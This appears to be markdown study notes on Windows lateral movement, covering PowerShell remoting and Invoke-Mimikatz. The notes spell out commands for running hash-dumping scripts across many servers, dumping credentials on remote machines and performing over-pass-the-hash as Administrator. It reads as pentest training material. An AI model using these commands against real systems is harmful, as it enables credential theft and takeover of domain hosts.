# Lateral Movement 

## Powershell Remoting

* increasingly used in enterprises. enabled by default on server 2012 onwards.
* need to enable remoting (EnablePSRemoting) on desktop windows machine, admin privs required,
* get elevated shell on remote system if admin creds are used to authenticate which is default setting


#### powershell remoting type: one-to-one
* one-to-one
* PSSession
  * interactive
  * runs in a new process (wsmprovhost)
  * is stateful
* useful cmdlets
  * New-PSSession
  * Enter-PSSession


#### powershell remoting type: one-to-many
* one-to-many
* knows as fan-out remoting
* non interactive
* executes commands parallely
* useful cmdlets
  * Invoke-Command

* run commands and scripts on
  * multiple remote computers
  * in disconnected sessions (v3)
  * as background job and more
* best thing in powershell for passing the hashes, using credentials and executing commands on multiple remote computers
* use -Credential parameter to pass user/pass


* execute commands or scriptblocks
```powershell
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content list_of_servers)
```

* execute scripts from files
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content list_of_servers)
```

* execute locally loaded function on the remote machine
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content list_of_servers)
```

* passing arguments. only positional arguments could be passed this way
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content list_of_servers) -ArgumentList
```

* function call within the script is used
```powershell
Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 - ComputerName (Get-Content list_of_servers)
```

* execute stateful commands using Invoke-Command
```powershell
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

<br>

## Invoke-Mimikatz

* script used to dump credentials, tickets and more using mimikatz with powershell without dropping the mimikatz exe to disk
* usefull for passing and replaying hashes, tickets and for many AD attacks
* using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All functions of mimikatz could be used from this script
* script needs administrative privileges for dumping credentials from local machine. many attacks need specific privileges.

* dump credentials on local machine
```powershell
Invoke-Minikatz -DumpCreds
```

* dump credentials on multiple remote machines
```powershell
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

* Invoke-Mimikatz uses powershell remoting cmdlet Invoke-Command to do above

* "Over pass the hash" generate tokens from hashes
```powershell
Invoke-Mimikatz -Command '''sekurlsa::pth /user:Administrator /domain:sub.domain.local /ntlm:ntlmhash /run:powershell.exe'''
```

































